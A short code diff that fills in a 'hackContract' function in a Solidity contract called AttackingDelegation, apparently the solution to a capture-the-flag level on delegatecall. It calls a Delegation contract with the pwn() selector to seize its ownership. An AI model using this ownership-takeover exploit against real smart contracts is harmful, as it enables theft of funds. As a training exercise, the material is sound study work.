@@ -10,6 +10,7 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        Delegation delegation = Delegation(contractAddress);
+        address(delegation).call(abi.encodePacked((keccak256("pwn()"))));
     }
 }
